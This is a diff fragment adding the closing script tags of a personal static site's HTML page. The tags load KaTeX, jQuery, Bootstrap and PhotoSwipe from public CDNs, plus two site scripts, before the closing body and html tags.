+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/contrib/auto-render.min.js" integrity="sha384-dq1/gEHSxPZQ7DdrM82ID4YVol9BYyU7GbWlIwnwyPzotpoc57wDw/guX8EaYGPx" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="https://lud1161.github.io/js/main.js"></script><script> renderMathInElement(document.body); </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
+<script src="https://lud1161.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
+
